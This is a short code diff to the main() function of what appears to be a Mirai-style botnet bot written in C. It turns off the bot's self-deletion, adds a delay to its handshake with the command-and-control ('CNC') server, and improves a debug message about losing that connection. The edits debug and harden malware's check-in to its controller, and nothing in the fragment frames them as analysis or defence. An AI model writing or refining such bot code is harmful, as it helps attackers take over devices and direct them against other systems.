@@ -58,7 +58,7 @@ int main(int argc, char **args)
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    //unlink(args[0]);
 
     // Signal based control flow
     sigemptyset(&sigs);
@@ -261,6 +261,9 @@ int main(int argc, char **args)
 
                     LOCAL_ADDR = util_local_addr();
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    //tcp is a streaming protocol, not aware of "message" boundaries
+                    //TODO: improve it
+                    sleep(1);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
                     {
@@ -327,7 +330,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
 #ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
+                printf("[main] Lost connection with CNC (errno = %d) 2, %s\n", errno, strerror(errno));
 #endif
                 teardown_connection();
                 continue;
